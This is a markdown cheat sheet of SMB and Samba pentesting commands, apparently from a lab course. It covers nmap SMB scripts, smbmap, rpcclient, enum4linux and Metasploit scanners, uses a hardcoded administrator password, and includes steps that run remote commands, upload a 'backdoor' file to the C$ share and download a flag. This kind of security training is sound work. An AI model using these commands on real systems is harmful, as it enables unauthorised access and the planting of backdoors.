## SMB 
+ Try to run the nmap to get the target host ip
- `nmap -T4 10.5.27.0/20 -o nmap.txt`
- 'nmap -Pn -A -sC -T4 10.5.19.82 -o nmap.txt` ---> Port scan on target ip
- `net use * /delete` ---> It delete smb local connection
- `net use z: \\10.5.19.82\c$ smbserver_771 /user:administrator`
- `nmap -p 445 --script smb-protocols 10.0.1.22`
- `nmap -p 445 --script smb-security-mode 10.0.1.22`
- `nmap -p 445 --script smb-enum-seesions 10.0.1.22`
- `nmap -p 445 --script smb-enum-seesions --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
- `nmap -p 445 --script smb-enum-shares --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
- `nmap -p 445 --script smb-enum-users --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
- `nmap -p 445 --script smb-server-stats --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
- `nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
- `nmap -p 445 --script smb-enum-* --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
### SMBMap
- `smbmap -u guest -p "" -d . -H 10.0.1.22`
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22`
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 -x "ipconfig"`
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 -L`
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 -r 'C$'` ---> reads the content of the 'C' drive
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 --upload '/root/backdoor' 'C$\backdoor'`
  - `--upload '/root/backdoor'`---> upload the backdoor file 
  - `'C$\backdoor'`  ---> giving the path to where to upload the backdoor file in target system 
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 --download "C$\flag.txt"`
- 
## Samba

#### Metasploit
* To find the smb version we can use metasploit also
- `msfconsole`
- `user auxiliary/scanner/smb/smb_version`
- `show options`
- `set rhosts <target_ip>`
- `run` or `exploit`

### nmblookup
- `nmblookup -A 10.0.1.22`
  - If you get the result `SAMBA-RECON  <20>`
  - That means there is a server running
  - so using `smbclient` we can connect to the server
  
#### smbclient
- `smbclient -L 10.0.1.22 -N`
- `rpcclient -U "" -N 10.0.1.22`

### Samba 2
- `rpcclient -U "" -N 10.0.1.22`
  - `enumdomusers`
  - `lookupnames admin`
  - `srvinfo`
- `enum4linux -o 10.0.1.22`
- `enum4linux -U 10.0.1.22`
- `smbclient -L 10.0.1.22 -N`
- `msfconsole`
- `use auxiliary/scanner/smb/smb2`
- `set RHOSTS 10.0.1.22`
- `exploit`
